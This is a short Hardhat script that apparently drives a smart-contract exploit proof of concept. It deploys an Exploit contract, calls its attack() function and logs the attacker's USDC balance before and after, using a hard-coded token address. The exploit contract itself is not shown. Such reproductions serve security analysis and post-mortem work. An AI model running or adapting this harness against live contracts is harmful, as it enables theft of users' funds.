import hre from "hardhat"
import {Exploit__factory, IERC20__factory} from "../typechain";
import {formatUnits} from "ethers/lib/utils";

async function main() {
  const [signer] = await hre.ethers.getSigners();
  const usdc = IERC20__factory.connect("0x04068DA6C83AFCFA0e13ba15A6696662335D5B75",signer);
  const exploit = await new Exploit__factory(signer).deploy();

  console.log("USDC balance of attacker : ",formatUnits(await usdc.balanceOf(signer.address),6));
  console.log("Exploiting...")
  await exploit.attack()
  console.log("Exploit complete.")
  console.log("USDC balance of attacker : ",formatUnits(await usdc.balanceOf(signer.address),6));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
